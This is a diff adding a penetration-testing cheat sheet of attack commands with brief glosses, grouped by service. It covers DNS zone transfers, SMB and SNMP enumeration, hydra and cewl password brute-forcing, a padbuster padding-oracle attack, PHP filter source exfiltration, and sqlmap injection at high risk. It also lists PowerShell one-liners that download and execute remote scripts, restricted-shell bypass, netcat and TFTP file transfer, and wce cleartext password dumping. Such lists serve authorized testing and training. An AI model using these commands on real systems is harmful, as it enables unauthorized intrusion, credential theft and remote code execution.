@@ -1,0 +1,61 @@
+# DNS
+dnsrecon -r $RANGE -n $NAMESERVER -> enumerate DNS
+dnsrecon -d $DOMAIN -t axfr -> try zone transfer
+dig axfr $DOMAIN @$ZONE -> try zone transfer
+host -t ns $DOMAIN -> enumerate nameserver, also try mx in place of ns for mail servers
+host -l $DOMAIN $NAMESERVER -> try zone transfer
+
+# IIS
+davtest -e $IP -> perform basic enumeration
+
+# LDAP
+ldapsearch -x -h $IP -s base namingcontexts
+
+# NETCAT
+nc -nv $IP $PORT -q 0 < $FILE -> terminate automatically after file transfer completes
+
+# NFS
+showmount -a $HOST -> show mount information (try -d and -e flags as well)
+
+# NMAP
+nmap -sn $RANGE -> ping sweep
+
+# PADDING ATTACKS
+perl padbuster.pl $IP $COOKIE $BLOCKSIZE -cookies auth=$COOKIE ->  Blocksize is 8 or 16
+
+# PASSWORDS
+hydra -e nsr -> try some very basic username permutations for password (null, login, reversed)
+cewl $URL -m 6 -w $OUTFILE -> generate wordlist from website for PW bruteforce
+
+# PHP
+scandir("$DIR") -> 'ls' equivalent, usually not restricted
+file_get_contents("$FILE") -> 'cat' equivalent, usually not restricted
+php://filter/convert.base64-encode/resource=$FILE -> exfiltrate .php source code
+
+# POWERSHELL
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://$IP:$PORT/$FILE','$OUTFILE')" -> download file to target system
+IEX (New-Object Net.WebClient).downloadstring("$SCRIPTURL") -> execute .ps1 script remotely
+$COMMAND | powershell -noprofile -> bypass script execution
+
+# SMB
+smbclient -N -L //$URL/ -> list shares
+smbclient -N //$URL/$SHARE/ -> access share
+onesixtyone -c $COMMUNITYSTRING -i $IPLIST -> check for SNMP community strings (examples: manager, public, private)
+snmpwalk -c $COMMUNITYSTRING -v1 $IP -> try to read MIB endpoint
+
+# SQL
+xp_dirtree $URL/$SHARE -> list all files
+sqlmap -r $REQUESTFILE --level 4 --risk 3 -> test for SQL injection
+
+# SSH
+ssh $USER@$IP bash -> bypass restricted shell
+
+# TFTP
+atftpd --daemon --port 69 $FOLDER -> set up TFTP server
+tftp -i 10.11.0.5 get $FILE -> download file
+
+# WINDOWS
+upx -n 9 $FILE -> package file to decrease size
+wine exe2bat $INFILE $OUTFILE -> convert .exe to .bat for easier transfer
+wce -w -> try to detect cleartext passwords
+
